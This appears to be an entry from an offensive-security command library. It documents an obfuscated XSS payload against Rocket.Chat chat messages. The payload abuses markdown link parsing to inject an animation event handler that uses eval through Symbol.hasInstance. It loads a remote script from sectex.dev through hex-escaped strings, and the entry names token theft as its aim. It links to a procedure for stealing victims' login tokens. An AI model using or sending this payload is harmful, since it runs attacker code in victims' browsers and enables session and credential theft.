---
data: >-
  https://a?p=[ ](https://
  style=animation-duration:1s;animation-name:blink;animation-iteration-count:2
  onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[]
  target=_blank data-x=`.")
tags:
  - xss
  - script-load
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.249Z'
id: 063b2fa5-fcf9-486f-b596-64f96e836961
verified: false
validated: true
submitted: true
---
# rocket-chat-xss-payload-external-script

## Command

```javascript
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.")
```

## Description

XSS payload variant to load an external script for advanced exploitation like token theft.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| s.src | URL of external script | Yes |
| document.createElement('script') | Creates script element | Yes |

## Examples

### Basic Usage

Send as chat message to trigger load.

## Expected Output

External script loads and executes from https://sectex.dev/files/cswsh.js.

## Related

- [[commands/rocket-chat-xss-payload-alert]]
- [[procedures/Steal-Victims-Login-Token]]
